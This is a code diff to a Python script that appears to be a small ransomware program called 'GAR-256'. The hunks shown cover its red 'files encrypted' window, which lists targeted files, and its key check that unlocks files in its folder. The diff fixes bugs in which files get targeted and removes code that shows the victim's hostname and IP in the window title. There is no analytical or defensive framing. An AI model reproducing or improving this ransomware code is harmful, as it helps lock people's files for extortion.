@@ -161,7 +161,7 @@ def check():
             fils = os.listdir(Path(__file__).parent)
             for fl in range(len(fils)):
                 if fils[fl] != randName:
-                    if canEnc(fils[fl]) and fils[fl].find(".GAR"):
+                    if canEnc(fils[fl]) and fils[fl].find(".GAR") > 0:
                         padir = str(Path(__file__).parent) + "/"
                         toEncFlW = Path(padir+ "/" + fils[fl])
                         daya = str(toEncFlW.read_text())
@@ -174,7 +174,7 @@ def check():
             fils = os.listdir(Path(__file__).parent)
             for fl in range(len(fils)):
                 if fils[fl] != randName:
-                    if canEnc(fils[fl]) and fils[fl].find(".GAR"):
+                    if canEnc(fils[fl]) and fils[fl].find(".GAR") >0:
                         padir = str(Path(__file__).parent) + "\\"
                         toEncFlW = Path(padir+ "\\" + fils[fl])
                         daya = str(toEncFlW.read_text())
@@ -184,8 +184,7 @@ def check():
 
                         print("Unhashed : " + Path(padir + fils[fl]).name)
         base.destroy()
-        open("GAR.txt","a")
-        open("GAR.txt","w").write("All of your files have been Unencrypted!")
+        os.remove("GAR.txt")
 
     else:
         messagebox.showerror("Failed","Wrong key!")
@@ -193,14 +192,19 @@ def check():
 button = Button(base,text="Continue",command=check)
 local = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 local.connect(("8.8.8.8",80))
-base.title("GAR-256 MESSAGE _DATA_={os=" + ods + ",user=" + socket.gethostname() + ",ip=" + local.getsockname()[0] + "}")
+oks = "Windows"
+
+if Path(__file__).parent.name.find("/") > 0:
+    oks = "Linux"
+#base.title("GAR-256 MESSAGE _DATA_={os=" + oks + ",user=" + socket.gethostname() + ",ip=" + local.getsockname()[0] + "}")
+base.title("GAR-256 MESSAGE _DATA_={os=" + oks + "}")
 label.grid(row=0,column=0)
 button.grid(row=2,column=0)
 put.grid(row=1,column=0)
 base.configure(bg="red")
 for fl in range(len(fils)):
         if fils[fl] != randName:
-            if fils[fl].find(".txt") or fils[fl].find(".text"):
+            if canEnc(fils[fl]):
                 
                 label2 = Label(base,text = "Encrypted " + fils[fl],bg="red")
                 label2.grid(row=fl + 3,column=0)
